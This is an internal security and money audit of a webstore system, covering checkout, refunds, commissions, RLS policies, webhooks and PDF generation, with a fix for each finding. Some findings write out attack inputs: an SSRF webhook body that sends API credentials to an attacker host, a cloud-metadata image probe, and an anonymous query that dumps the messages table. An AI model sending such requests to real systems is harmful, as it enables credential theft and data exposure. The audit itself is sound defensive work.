# Webstore & Club-Store Money Audit — 2026-07-02

Top-to-bottom review of the native webstore + OMG club-store system: payments,
refunds, product rendering, commissions, fundraising payouts, PDF generation, and
email. Covers the storefront (`src/storefront/`), admin console (`src/Webstores.js`,
`src/OmgOrderPortal.js`), checkout/webhooks/emails (`netlify/functions/`), the
commission engine (`src/App.js`), and the live Supabase RLS state (queried directly).

Findings from the 2026-06-10 audit that are **still open** are marked ⟳.

---

## Production reality (read this first — it reframes severity)

Verified against the live database on 2026-07-02:

- **The native storefront card checkout has never carried a real payment.**
  `webstore_orders` has 138 rows, all `status='paid'`, **0 with a `stripe_pi_id`**,
  0 with a `processing_fee`, `sum(fundraise_amt)=0`. Every row is an OMG-mirrored
  order (prepaid on OrderMyGear). The Stripe `place_order → finalize` path,
  refunds, coupons, and fundraising have effectively **no production mileage**.
- **All 15 stores have the 5% processing fee enabled**, and the public store view
  does **not** expose that field — so the first real card shopper on any store will
  be blocked (Critical #3 below). The go-forward business is broken on arrival.
- **Coach-portal invoice payments (Stripe) ARE live** — so the refund-endpoint and
  reconciliation findings that touch invoices are real today, not latent.

Net: the security holes (SSRF, anon data exposure, over-broad RLS) are live now; the
checkout/refund/payout **correctness** bugs are mostly latent but will fire the
moment real card orders flow. Fix the Criticals before opening the storefront to card
payments.

---

## CRITICAL

### 1. ShipStation webhook: unauthenticated, leaks API credentials (SSRF) + lets anyone corrupt orders ⟳
`netlify/functions/shipstation-webhook.js:37-46` — **LIVE.** No signature/secret/IP
check. The handler fetches the caller-supplied `body.resource_url` verbatim with the
ShipStation `Authorization: Basic` header attached. `POST {"resource_type":"SHIP_NOTIFY","resource_url":"https://attacker/x"}`
→ attacker's server receives the company ShipStation key+secret. The attacker can then
return fabricated `shipments` JSON keyed `WS-<order-uuid>` to insert `webstore_shipments`
rows, mark lines shipped, overwrite `webstore_orders.label_cost` and
`sales_orders._shipping_cost`, and email real buyers attacker-controlled "shipped"
notices. Flagged 2026-06-10; never fixed.
**Fix:** require a shared secret in the webhook URL and verify it; never fetch
`resource_url` as given — require host `ssapi.shipstation.com` before attaching creds.

### 2. `messages` table is readable by anonymous visitors — full PII + internal-notes leak
Live RLS: policy `messages_anon_read` (`anon`, `SELECT USING(true)`) + anon has the
SELECT grant. Any visitor using the shipped anon key can run
`supabase.from('messages').select('*')` and dump all 157 threads: 115 sales-order
threads, 33 issue threads, 7 estimates, 2 webstore orders — including internal staff
notes, `tagged_members`, author, and customer contact context. No app code needs this:
the storefront's order thread loads server-side through `webstore-checkout` (service
role); every other `messages` query is on authenticated staff screens. **This policy
is not in any repo migration — it was applied out-of-band.**
**Fix:** `DROP POLICY messages_anon_read ON messages;` and `REVOKE SELECT ON messages FROM anon;`
Commit it as a migration.

### 3. Native card checkout is broken on every store — `processing_pct` missing from the public view
`src/storefront/Storefront.js:34-37,1445-1472` reads `store.processing_pct` from the
`webstores_public` view to compute the total and `expectedTotalCents`. The live view
**does not include `processing_pct`** (verified), so the client fee is `undefined → $0`.
The server (`webstore-checkout.js:196,331-338`) charges the real 5% and rejects any
>1¢ mismatch with `409 totals_changed`. Since all 15 stores have the fee on, **every
card checkout will 409 and can never complete.** Not yet observed only because no real
card order has been placed.
**Fix:** add `processing_pct` to `webstores_public` (and reconcile the two conflicting
view histories — see M "view drift"). Verify the deployed view afterward.

### 4. `pdf-generator.js` is a public, unauthenticated HTML→PDF renderer (SSRF / DoS / brand forgery)
`netlify/functions/pdf-generator.js:26-65` — no auth of any kind. Takes caller-supplied
`html`, `page.setContent(html)`, then actively waits for every `<img>` to load before
returning the PDF. Anyone can POST `<img src="http://169.254.169.254/…">` to make
Chromium fetch internal URLs (SSRF read primitive), burn the 26s Chromium budget
(DoS), or forge NSA-branded PDFs. The client caller `_serverPdf` (`src/utils.js:794`)
doesn't even attach auth.
**Fix:** gate with `verifyUser` (switch `_serverPdf` to `authFetch`); deny remote
resource loading; cap payload size.

### 5. Refund endpoint is unscoped, unrecorded, non-atomic, and has no chargeback handling
A cluster in the refund path (coach-portal invoice refunds are live; webstore refunds
latent until card orders exist):
- **Unscoped/unrecorded:** `netlify/functions/stripe-payment.js:190-207` — any active
  team member (any role) can refund **any** `payment_intent_id` for **any** amount,
  with no link to an order/invoice, no server cap beyond Stripe's, no idempotency key,
  and it writes **nothing** to the DB. The only refund bookkeeping lives in the browser
  (`Webstores.js:1896-1906`). `supabase_migration_029_webstore_order_refunds.sql`
  despite its name creates **no refund table** — only a single `refunded_amt` column,
  so there is zero per-refund audit trail (who/when/how much/Stripe id).
- **Non-atomic:** Stripe refund fires, then the browser writes `refunded_amt`; if that
  write fails (RLS, expired session, closed tab) money left Stripe but the DB is stale,
  and a retry re-refunds (cap check reads the stale `refunded_amt=0`). Concurrent tabs
  race the read-modify-write.
- **No `charge.refunded` / `charge.dispute.created` webhook** (`stripe-webhook.js:36`
  handles only `payment_intent.succeeded`). Dashboard-issued refunds and chargebacks
  leave the order `status='paid'` → it batches, ships, and pays the club fundraise on
  returned money; disputes are invisible (plus the dispute fee).
**Fix:** one server-side refund endpoint: resolve the PI from an order/invoice record,
cap at `total − refunded_amt`, create the Stripe refund with an idempotency key, insert
a refund row + atomically bump `refunded_amt`, log the actor; add `charge.refunded` and
`charge.dispute.created` webhook handlers as the backstop.

---

## HIGH

### 6. Staff order edits recompute `total` WITHOUT tax or processing fee (4 independent confirmations)
`src/Webstores.js:1871` sets `total = max(0, subtotal + fundraise − discount) + shipping_fee`,
dropping `tax` and `processing_fee` that checkout charged (`webstore-checkout.js:347,364`).
Any item edit on a paid order — even a size-only fix — shrinks `total` below the actual
card charge. Downstream: the refund over-cap check (`:1892`) now blocks refunding the
tax/processing the buyer really paid; batch payment notes, close-out gross, and the
accounting ledger all diverge from Stripe. The refund modal's `newTotal` preview
(`:9395`) has the same omission. No guard against editing paid/batched orders; no audit row.
**Fix:** recompute using stored `tax` + `processing_fee`; block money-changing edits on
paid orders unless paired with a refund; cap refunds at the Stripe PI amount, not a
rewritable column.

### 7. Reps earn commission on the club's fundraising passthrough
At batch-to-SO, `unit_fundraise` is folded into the SO `unit_sell`
(`src/Webstores.js:2073,2082-2084,2230-2232`), and `calcGP` (`src/App.js:16810-16840`)
books no offsetting cost for the fundraise owed to the club, so commission = 30% of an
inflated GP. Example: $10,000 subtotal + $2,000 fundraise, $6,000 cost → GP booked
$6,000, commission $1,800; true GP after paying the club is $4,000, commission should
be $1,200 — **$600 overpay**, and every margin report overstates by the full fundraise.
**Fix:** carry the store fundraise total as an SO-level cost (like `_inbound_freight`),
or keep it off `unit_sell` as a pass-through line excluded from GP.

### 8. Club fundraising payout collapses to ~$0 after orders are batched
`src/Webstores.js:8508` computes "amount owed to club" from `status === 'paid'`, but
batching sets `status = 'batched'` (`:2254`). The normal workflow is close → batch →
pay the club, so by payout time card-paid fundraising reads as "pending" and
`printPayout` (`:37-53`) shows ~$0 owed. The close-out email has the same basis
(`_webstoreClose.js`).
**Fix:** derive "collected" from `payment_mode==='paid'` and status ∉
{pending_payment, cancelled, refunded}, net of refunds — not lifecycle `status`.

### 9. Coupon discounts never reduce stored `fundraise_amt` → clubs overpaid on discounted orders
Discount is applied over subtotal+fundraise (`webstore-checkout.js:198-202,330`) but the
stored `fundraise_amt` is gross (`:364`); every payout consumer uses the gross value
(`_webstoreClose.js:28`, `Webstores.js:8504/8508`, `printPayout`). A $50 item + $10
fundraise with a 100%-off code collects $0 yet records $10 owed to the club. (The
SO/commission side *does* net discounts — the two disagree by design gap.)
**Fix:** prorate `discount_amt` across subtotal and fundraise when storing (or in payout math).

### 10. Every webstore money table is writable by ANY authenticated session — including coach magic-link users
`supabase/migrations/00134_webstore_rls_lockdown.sql:43-46` — `for all to authenticated
using(true) with check(true)` on `webstores, webstore_orders, webstore_order_items,
webstore_coupons, webstore_shipments, webstore_transfers`. Coaches sign in via Supabase
magic link and are plain `authenticated`. From the browser console a coach (or any
authenticated user) can set any order's `refunded_amt`/`total`/`status`, mint 100%-off
coupons on any store, or delete shipments — across all customers. Anon is correctly
locked out; the gap is the authenticated breadth. LIVE.
**Fix:** gate these tables on a `team_members` EXISTS policy (pattern already in
`00131_coach_accounts_staff.sql`); give the coach portal narrow scoped policies/RPCs.

### 11. Abandoned `pending_payment` orders permanently consume jersey numbers ⟳
`webstore-checkout.js:408-415` inserts number claims before payment;
`UNIQUE(store_id, player_number)` with no expiry. Rollback only runs on server-side
failures — nothing releases claims when a buyer abandons the card form (webhook handles
only `succeeded`; no cron). A shopper who clicks "Continue to payment", changes their
mind, and re-checks out is blocked by their own dead order — permanently, for the whole
store. Refunds/cancellations also never release claims.
**Fix:** release claims on `pending_payment` orders older than ~30 min (or handle
`payment_intent.canceled`); release on full refund/line removal; add an admin
"release number" control.

### 12. `totals_changed` 409 is a permanent dead-end
Cart lines snapshot prices into localStorage with no TTL/revalidation
(`Storefront.js:26-28,1026-1036`). On 409 the server returns corrected `totals`, but the
client discards them and only shows the error (`:1461,1473`). Any price/fundraise change
means the shopper retries with the same stale total → same 409 forever; the only escape
is emptying the cart.
**Fix:** on `code==='totals_changed'`, re-fetch products and reprice the cart, then show
"prices updated" with the new total.

### 13. Checkout not frozen after the PaymentIntent is created
`Storefront.js:1517-1563` — coupon input, address, and method toggle stay live after
`clientSecret` is set. Applying a coupon lowers the displayed Total while the PI amount
is fixed → the card is charged the original amount. Switching to "team tab" after
starting card creates a **second** order (duplicate + number-claim conflict).
**Fix:** lock coupon/address/method once `clientSecret` exists (or cancel the pending
order+PI and restart on change).

### 14. Sold-out sized items can be added with no size and pass checkout
`Storefront.js:1008-1025` — a tracked item with zero sellable sizes returns an empty
size list, so `needSize` is false and Add-to-Cart is enabled despite the "Sold out"
pill. Server `checkStock` only validates singles **with** a size
(`webstore-checkout.js:143`) and `priceCart` treats size as optional (`:115`), so the
order is accepted with `size=NULL` and zero stock — unfulfillable, stock guard bypassed.
**Fix:** client — disable Add-to-Cart when a tracked sized product has no sellable sizes
and nothing incoming. Server — reject sized products arriving with no size.

### 15. Bake-mode mockups erase production decoration metadata
`src/Webstores.js:1697` clears `decorations = []` when a Quick Mock is applied (the logo
is baked into the image). At store→SO conversion (`:2128-2134,2233`) `decosByKey` is then
empty for that item, so the SO line is emitted `no_deco:true` with no art line and no art
file. A shopper buys a hoodie showing the team logo; production is told there's nothing to
print.
**Fix:** when baking, keep a decoration/`baked_art` record carrying `art_id`+placement so
SO conversion emits an art deco line.

### 16. Unsigned Cloudinary upload preset is fully public
`src/utils.js:168-171` and `src/storefront/BuildStore.js:28` embed the cloud name +
unsigned preset `ml_default_nsaportal` with `resType='auto'` in the public bundle. Anyone
can upload unlimited arbitrary files (including non-images) into NSA's Cloudinary account
under a URL the app trusts — cost abuse + hosting of phishing/malware content.
**Fix:** move uploads behind a signed-upload function (staff-gated where possible); at
minimum restrict the preset to images, cap size, enable moderation.

### 17. `receipt.js` — public receipt read + send-to-anyone
`netlify/functions/receipt.js:119-155` — GET renders the full receipt (payer billing
name, address, invoice line items, amounts) for any `payment_intent_id` with no auth;
POST emails that receipt to a **caller-supplied** address. Anyone holding a `pi_…` id
(they appear in client secrets, URLs, logs) can read a payer's PII and spray an authentic
NSA-branded receipt to any inbox.
**Fix:** POST sends only to the email on file for the invoice; require auth or rate-limit
the GET.

---

## MEDIUM

- **Order status can regress to `paid`.** `stripe-webhook.js:43` and
  `webstore-checkout.js:486` guard only `.neq('status','paid')`; a delayed/retried
  `payment_intent.succeeded` flips a `refunded`/`cancelled`/`batched` order back to
  `paid` → it re-batches and ships. Batch link (`Webstores.js:2254`) has no status guard
  either. **Fix:** require `status='pending_payment'` on the flip; exclude terminal
  statuses on batch link.
- **`webstore-closed-notify` stamps OPEN stores as notified.** `webstore-closed-notify.js:22-26`
  never checks `status==='closed'` before stamping `closed_notified_at`
  (`_webstoreClose.js:106`) → a stray POST permanently suppresses the real close-out
  (no to-do, no email). **Fix:** reject unless closed.
- **Close-notify idempotency is check-then-act.** Hourly sweep + manual close can both
  pass the stale check → duplicate rep to-dos + CSR emails. **Fix:** atomic
  claim (`update … where closed_notified_at is null` and proceed only on a returned row).
- **Close-out breakdown ignores partial refunds.** `_webstoreClose.js:16,27-28` drops
  only fully-`refunded` orders and sums gross `total`/`fundraise_amt` — partially-refunded
  orders overstate gross and fundraising owed.
- **Voiding one label deletes ALL shipments for the order.** `Webstores.js:9200-9210`
  (and `OmgOrderPortal.js:634-636`) run `webstore_shipments.delete().eq('order_id',…)` and
  null `label_cost` when voiding the last label — a partially-shipped order loses earlier
  valid shipment records and understates SO shipping margin. **Fix:** delete only the
  voided shipment; recompute `label_cost` from the remainder.
- **`webstore_orders.cc_fee` is never written** (migration 046 added it; no writer). The
  accounting "Card processing fees" line and "net after fees" (`Webstores.js:8527,8531`)
  are always $0 → overstates store profit by ~3%. **Fix:** capture the fee from the PI
  balance transaction at finalize/webhook.
- **Stores accept orders up to ~1h past `close_at`.** Sweep is hourly
  (`netlify.toml:80-81`); checkout only checks `status!=='open'`
  (`webstore-checkout.js:309`), not `close_at`. Gap orders arrive after the rep was given
  final totals. **Fix:** also check `close_at` at checkout.
- **Coupon percent is unvalidated.** `Webstores.js:1822-1833` (HTML `min/max` only) and
  `webstore-checkout.js:198-202` accept negative or >100. `-10` **surcharges** every
  buyer 10%; `150` comps orders including shipping. **Fix:** clamp 0–100 in both create
  and redeem.
- **Decoration snapshot not taken at order time.** Order items store no decoration data;
  SO conversion reads *live* `webstore_products.decorations` (`Webstores.js:2128-2134`).
  Stores stay open for weeks; if staff re-place a logo, production prints the current art,
  not what the shopper approved. **Fix:** snapshot decorations + rendered image URL onto
  the order item at `place_order`.
- **Confirmation email doesn't foot — fundraising is omitted.** `_webstoreEmail.js:67-72`
  sums line `unit_price` (which excludes fundraise) + fees, then prints `order.total`
  (which includes fundraise). On any fundraising store the visible lines are short of the
  Total by the fundraise amount → support tickets. **Fix:** add a "Team fundraising" line.
- **Confirmation email interpolates buyer/player/address fields unescaped.**
  `_webstoreEmail.js:24,35-36,42,52,66` — HTML injection (self-targeted, but the only
  sender here missing the `esc()` every other sender uses). **Fix:** escape all
  interpolated DB/user strings.
- **Confirmation marked "sent" before the send succeeds.** All three paths flip
  `confirmation_sent=true` then call Brevo and swallow failures
  (`webstore-checkout.js:443,490`; `stripe-webhook.js:48`); `sendOrderConfirmation`
  doesn't even check `resp.ok`. A transient Brevo 5xx → buyer never gets the
  confirmation/tracking link and no path retries. **Fix:** set the flag only after a
  verified send; let the webhook/sweep retry on failure.
- **Comped (100%-off) orders show a tax amount that isn't charged.** `quoteTotals`
  always computes tax (`webstore-checkout.js:465`) but `placeOrder` charges tax only when
  `preTax>0` (`:345`). **Fix:** skip tax in the quote when preTax≤0.
- **image-proxy follows redirects (SSRF pivot), no size/type cap, no auth.**
  `image-proxy.js:16-27` allowlists only the first hop; an open redirect on a vendor host
  reaches internal URLs. `cloudinary.com` allowlists every tenant. **Fix:** `redirect:'manual'`,
  cap bytes, require `content-type: image/*`, pin Cloudinary to the NSA tenant.
- **Sales tax on refunds is wrong both ways.** Line-removal refund suggestion excludes tax
  (`Webstores.js:9381`, `delta = total − tax − newTotal`) so the buyer isn't refunded the
  tax on removed items; and the TaxCloud `"returned"` action
  (`supabase/functions/taxcloud-capture`) has **zero callers**, so refunded sales are
  never reported → tax over-remitted. **Fix:** include prorated tax in the refund
  suggestion; wire a TaxCloud Returned call on refund.
- **Coupon `used_count` never decremented on refund** (`_webstoreEmail.js:92-102` only
  increments). A single-use code burned on a fully-refunded order stays consumed.
- **Team-tab ("unpaid") credits are a number and nothing else.** `refundOrder` writes
  `refunded_amt` with no Stripe call, no credit ledger (`customer_credits` untouched), no
  notification; post-batch credits don't adjust the SO/invoice. No order-cancel path
  exists anywhere (`status:'cancelled'` is never written).
- **Refund race under-records** across two tabs/staff (per-tab latch only; read-modify-write
  on `refunded_amt`) — DB shows less refunded than Stripe actually returned.
- **Overlay-decorated items look undecorated in bundles, order emails, and the status
  page.** Bundle tiles gate out `DecoOverlay` (`Storefront.js:852,866`); overlay-mode
  singles carry `image_url=NULL` so `getOrder`/confirmation fall back to the undecorated
  catalog image. Shopper's confirmation shows a blank garment.
- **Hero collage renders decorations at the wrong position** — featured tiles use 4/3 or
  1/1 with `objectFit:cover` but overlay coordinates authored against the 4/5 crop
  (`Storefront.js:597-600`), so the logo floats off the chest on the store's most
  prominent imagery.
- **Storefront view leaks internal stock + draft stores.** `webstore_storefront_products`
  publishes exact per-size `size_stock`/`vendor_size_stock`/`vendor_on_hand`/`on_order_qty`
  with no store-status filter; `webstores_public` exposes every non-`archived` store
  (drafts included). Competitors can scrape live stock and unreleased stores/pricing.
  **Fix:** filter the views to `status='open'`; expose an in-stock/backorder boolean
  instead of raw quantities.
- **Bundle components bypass stock validation** on both sides (`checkStock` filters to
  `kind==='single'`) → sold-out sizes sell unbounded inside packs.
- **View history drift.** Two conflicting `webstores_public` definitions
  (root `supabase_migration_*` vs `supabase/migrations/00134`) differ on
  `public_listed`/`featured_product_ids`; whichever is live, the other breaks either the
  public directory (`TeamStores.js:106`) or featured products (`Storefront.js:617`).
  Reconcile and fold in `processing_pct` (Critical #3). More broadly, several live
  policies/grants (e.g. `messages_anon_read`, the storefront view grants) exist only
  out-of-band — a rebuild from committed migrations reintroduces the old open state.
- **Public source-art leak.** `webstore_products.decorations[].source_url`/`orig_url` (the
  original .ai/.eps upload) is published to anon via the storefront view. **Fix:** strip
  from the view.
- **No rate limiting on public checkout endpoints.** `check_coupon` is a code-brute-force
  oracle (distinct error strings confirm hits → discover scholarship/100%-off codes);
  `quote` is a free pricing oracle; `place_order`/`post_message` enable spam +
  outbound-email abuse. **Fix:** per-IP throttle + generic coupon error text.

---

## LOW

- `finalize` result ignored; "Order Confirmed / Paid in full" shown unconditionally from
  `payment_mode`, never `order.status` (`Storefront.js:1486,1710`) — a stuck
  `pending_payment` order still reads "paid"; and if the tab dies between
  `confirmPayment` and `finalize`, the cart isn't cleared (double-purchase risk).
- Bundle `size_required` divergence (`Storefront.js:1159` vs `webstore-checkout.js:96`) →
  some packs are un-purchasable (client adds, server 409s "missing size").
- `get_order` returns `status_token` (and full PII) to anyone holding the order UUID
  (`webstore-checkout.js:521,537`) — needlessly escalates the UUID to the messaging token.
- `update_ship` accepts the bare order UUID as the sole credential to redirect a shipment
  (`webstore-checkout.js:661`) — UUID leaks via URLs/referrers; prefer the `status_token`.
- Cart qty stepper unbounded; server clamps at 100 → `totals_changed` dead-end.
- Legacy shipped-line fallback is qty-blind (`shipstation-webhook.js:94-98`); shipments
  without a tracking number bypass idempotency and double-count cost (`:64-67`).
- Client label flow overwrites instead of summing `label_cost` (`Webstores.js:8944`).
- Headline analytics/`rep-daily-digest` count refunded orders at full value
  (`Webstores.js:8496`; `rep-daily-digest.js:11,46`).
- Batch unit-sell per-unit rounding can drift the SO total a few cents from collected.
- `vectorizer-auth.js` returns a reusable API secret to any staff session and appears
  unused — delete it.
- No app-side refund/credit email to the buyer (card refunds may get Stripe's automatic
  receipt; team-tab credits notify nobody).
- Emails: NSA logo 404s if `PORTAL_PUBLIC_URL` is the marketing domain
  (`_webstoreEmail.js:44,53`, `webstore-message-notify.js:39` — use the `assetBase`
  pattern from `omg-order-notify.js:125`); empty-string portal fallback breaks
  links/logos if the env var is unset; `coach-invite.js` invites replies from an
  unmonitored `noreply@`.
- Non-allowlisted vendor image hosts (`lh3.googleusercontent.com`,
  `assetly.ordermygear.com`) can't load in the mock builder.
- Orphaned Cloudinary assets accumulate (no deletes on item/store/decoration removal).
- Storefront images served at full resolution, no `f_auto,q_auto,w_` transforms, minimal
  lazy-loading — a 20-item grid of baked mocks can pull tens of MB.

---

## Verified solid (works correctly)

- **Server-authoritative pricing.** `place_order` re-prices the whole cart from the DB
  and ignores client dollar amounts; a pre-tax drift guard compares to `expectedTotalCents`
  (`webstore-checkout.js:54-124,337`). Client cart tampering can't change the charged price.
- **`effFund` mirrors the storefront view exactly** (checkout `:30-41` vs migration 047),
  including `ceil` rounding, so display and charged prices agree when data is fresh.
- **Stripe finalize verification** re-fetches the PI and checks `succeeded` + exact amount
  + metadata order-id match before flipping to paid (`:470-495`).
- **Idempotent confirmation email + coupon bump** via the atomic `confirmation_sent` claim
  shared by finalize and the webhook — exactly one email, one bump
  (`:443,490`; `stripe-webhook.js:48-56`); coupon `used_count` uses an atomic CAS.
- **Webhook signature verified** (`stripe-webhook.js:29-33`); errors return 200 to avoid
  retry storms. **Invoice reconciliation is idempotent with an underpayment guard**
  (`_shared.js:111-116`).
- **Number-range + uniqueness enforced server-side** with correct per-player grouping and
  a DB unique-constraint fallback (`webstore-checkout.js:168-181,390-416`).
- **Anon is locked out of all webstore base tables** (`00134`); the storefront reads only
  browse-safe views and goes through `webstore-checkout`. Coupons removed from the client
  (`check_coupon` returns only `code/kind/value/cover_shipping`). `status_token` is a
  128-bit CSPRNG value.
- **Batch → SO integrity:** SO persisted before linking; `.is('so_id', null)` claim
  prevents concurrent double-batch; refunded/cancelled/pending excluded; coupon discount
  correctly spread and capped; bundle parent value allocated to components retail-weighted
  (`Webstores.js:2019,2067-2084,2114-2121,2248-2256`).
- **Coach fundraise cap enforced server-side** in `coach-store-submit` (clamped to
  `coach_store_config.max_fundraise`, prices locked from the server pool); the BuildStore
  slider is display-only.
- **All OMG endpoints and the ShipStation/OMG proxies are staff-gated** (`verifyUser`);
  OMG ingest is idempotent by `(store_id, omg_order_number)` and merges items by
  `(sku,size)` preserving fulfillment state and shipment links (`_shared.js:153-212`).
- **`brevo-proxy.js` is no longer an open relay** (`verifyUser` gates send + stats).
- **`followup-sweep.js`** uses RFC 8058 unsubscribe headers, HMAC unsubscribe tokens, and
  a claim-before-send lease.
- **Migration 037** correctly makes `line_status` monotonic (advance-only, never touches
  cancelled lines).
- **Tainted-canvas handling** in the mock builder is correct (`crossOrigin='anonymous'`
  everywhere), so `toDataURL` export never throws.
- **No `dangerouslySetInnerHTML` in the storefront**; store name, hero blurb, AI
  descriptions, product names, and messages all render as React-escaped text.
- **Commission** excludes portal CC surcharges and pays only on paid/partial invoices with
  an auditable late-rate override (`App.js:16810,16861-16867`) — the one defect is the
  fundraise-in-GP issue (#7).

---

## Suggested sequencing

1. **Before opening card checkout:** Criticals #1 (ShipStation SSRF), #2 (messages anon
   read), #3 (processing_pct in the view), #4 (pdf-generator auth), #5 (refund
   endpoint + chargeback webhooks).
2. **Correctness before real money flows:** #6 (order-edit total), #7 (commission on
   fundraise), #8 (payout status basis), #9 (discount vs fundraise), #10 (authenticated
   RLS breadth), #11 (number claims), #12–#14 (checkout UX dead-ends / oversell).
3. **Rendering + fulfillment truth:** #15 (baked mock metadata), decoration snapshot,
   #16 (Cloudinary preset).
4. Then the Medium/Low cleanups.

All findings were verified against the working tree and, where noted, the live database.
No code was changed by this audit.
